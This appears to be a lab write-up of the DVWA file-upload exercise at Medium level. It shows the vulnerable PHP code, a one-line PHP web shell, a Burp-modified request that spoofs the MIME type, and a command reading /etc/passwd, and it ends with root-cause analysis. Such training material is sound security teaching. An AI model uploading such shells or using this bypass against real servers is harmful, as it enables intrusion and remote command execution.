# File Upload — Medium

## Overview

The Medium security level introduces basic validation for uploaded files. It checks the uploaded file's MIME type and size before accepting it.

However, the application trusts the client-provided `Content-Type` header, allowing an attacker to bypass the MIME type check by modifying the request.

## Source Code Analysis

```php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];

    if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&
        ( $uploaded_size < 100000 ) ) {

        if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
            echo '<pre>Your image was not uploaded.</pre>';
        }
        else {
            echo "<pre>{$target_path} succesfully uploaded!</pre>";
        }
    }
    else {
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
    }
}

?>
```

The application performs two checks:

- **MIME Type:** Accepts only `image/jpeg` or `image/png`.
- **File Size:** Requires the uploaded file to be smaller than `100000` bytes.

However, it relies on `$_FILES['uploaded']['type']`, which is provided by the client and can be manipulated.

## Exploitation

### 1. Creating a PHP Web Shell

Create a file named `exploit.php` containing:

```php
<?php
    system($_GET['cmd']);
?>
```

### 2. Bypassing MIME Type Validation

Intercept the upload request using Burp Suite.

The original request contains the PHP file with the following MIME type:

```http
Content-Disposition: form-data; name="uploaded"; filename="exploit.php"
Content-Type: image/png
```

The important modification is changing the `Content-Type` value to `image/png`, while keeping the actual filename and PHP content unchanged.

**Modified upload request:**

```http
POST /vulnerabilities/upload/ HTTP/1.1
Content-Type: multipart/form-data; boundary=...

Content-Disposition: form-data; name="uploaded"; filename="exploit.php"
Content-Type: image/png

<?php
    system($_GET['cmd']);
?>
```

The server accepts the file because the supplied MIME type matches one of the allowed values and the file size is below the configured limit.

**Response:**

```http
HTTP/1.1 200 OK
```

```html
<pre>../../hackable/uploads/exploit.php succesfully uploaded!</pre>
```

### 3. Executing System Commands

After successfully uploading the PHP file, access it through the uploads directory and execute a command:

**Request:**

```http
GET /hackable/uploads/exploit.php?cmd=cat+/etc/passwd HTTP/1.1
```

**Response:**

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

The server executed the supplied command and returned the contents of `/etc/passwd`, confirming successful Remote Code Execution.

## Root Cause

The vulnerability exists because the application trusts the client-provided MIME type instead of independently validating the uploaded file.

Although the application checks the file type and size, an attacker can manipulate the `Content-Type` header to satisfy the MIME type condition without changing the actual file content.

Additionally, uploaded files are stored in a web-accessible directory where PHP execution is enabled.

## Impact

An attacker can bypass the MIME type validation, upload a PHP Web Shell, and execute operating system commands through the uploaded file.

The commands execute with the privileges of the web server process.

## Conclusion

The Medium security level demonstrates that client-side supplied file metadata cannot be trusted as a security control.

Validating the MIME type using `$_FILES['uploaded']['type']` is insufficient because the attacker controls the value sent in the upload request.
